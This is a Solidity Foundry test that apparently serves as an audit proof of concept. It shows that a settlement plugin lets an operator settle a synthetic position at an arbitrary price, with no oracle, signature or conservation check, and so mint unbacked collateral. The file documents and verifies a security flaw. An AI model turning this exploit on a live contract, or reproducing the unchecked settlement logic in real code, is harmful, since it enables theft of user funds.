// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./TransactionProcessor.basic.t.sol";
import "../src/predict/plugins/SettlementPlugin.sol";
import "../src/predict/transactions/SettlementTransLib.sol";
import "forge-std/console.sol";

/// @title PoC (N-4 / ECON-002): Settlement mints collateral at an unconstrained operator price (no oracle/sig)
/// @notice `SettlementTransLib.process` (predict path, LIVE) zeroes the synthetic and credits
/// `collateral += syntheticBalance * settlementPrice`, where `settlementPrice` is a raw operator input in
/// `[0, int128.max]` with NO signature, NO oracle binding, and NO aggregate (YES/NO) conservation check. The
/// operator can therefore settle any position at any price, minting unbacked, later-withdrawable collateral.
/// This PoC settles a position at a price unrelated to the oracle and shows collateral minted = balance * price.
contract PoC_SettlementUnconstrained is TransactionProcessorTestBasic {
    SettlementPlugin settlementPlugin;

    function setUp() public override {
        TransactionProcessorTestBasic.setUp();
        // Wire + register the predict SettlementPlugin (mirrors the other plugins in the base harness).
        bytes memory initData = abi.encodeWithSelector(SettlementPlugin.initialize.selector, deployer);
        settlementPlugin = SettlementPlugin(
            address(new TransparentUpgradeableProxy(address(new SettlementPlugin()), address(proxyAdmin), initData))
        );
        vm.startPrank(deployer);
        settlementPlugin.setTransactionProcessor(address(transactionProcessor));
        settlementPlugin.setPosition(address(positionManager));
        transactionProcessor.registerPlugin(address(settlementPlugin));
        vm.stopPrank();

        deposit(deployerUid, 10_000);
        setOraclePrice();            // oracle price = 1 * FXP
        setFundingIndicesInfo();
        setSyntheticAssetsInfo(synthAssetId, 1_000_000, 1 * FXP_32_ONE);
        // give the account a healthy long synthetic position of 100
        vm.prank(deployer);
        positionManager.getOrCreatePosition(deployerUid, synthAssetId);
        vm.prank(deployer);
        positionManager.updatePositionInDict(deployerUid, 0, synthAssetId, 100);
    }

    function test_PoC_settlementMintsUnbackedCollateralAtOperatorPrice() public {
        int256 colBefore = positionManager.getCollateralBalanceByAccountId(deployerUid);
        int256 synBefore = positionManager.getSyntheticBalance(deployerUid, synthAssetId);
        assertEq(synBefore, 100, "precondition: holds 100 synthetic");

        // The operator picks an ARBITRARY settlement price (50) — the oracle says 1, and no signature/oracle
        // check constrains it. (settlementPrice is also raw-scaled, so an FXP-scaled price would over-credit 2^32.)
        int256 operatorPrice = 50;
        Settlement memory s = Settlement({
            accountId: deployerUid, syntheticAssetId: synthAssetId, settlementPrice: operatorPrice
        });
        bytes[] memory txs = new bytes[](1);
        txs[0] = getMessage(TYPE_SETTLEMENT, abi.encode(s));
        executeMultiTransactions(txs);

        int256 colAfter = positionManager.getCollateralBalanceByAccountId(deployerUid);
        int256 synAfter = positionManager.getSyntheticBalance(deployerUid, synthAssetId);
        assertEq(synAfter, 0, "synthetic zeroed by settlement");
        // collateral minted == balance * operator-chosen price, with NO oracle/signature/conservation constraint
        assertEq(colAfter - colBefore, synBefore * operatorPrice,
            "BUG: collateral minted = balance * UNCONSTRAINED operator price (unbacked, no oracle/signature)");
        assertGt(colAfter - colBefore, 0, "unbacked collateral created");

        console.log("oracle price (FXP):", uint256(int256(1 * FXP_32_ONE)));
        console.log("operator settlement price used:", uint256(operatorPrice));
        console.log("unbacked collateral minted:", uint256(colAfter - colBefore));
    }
}
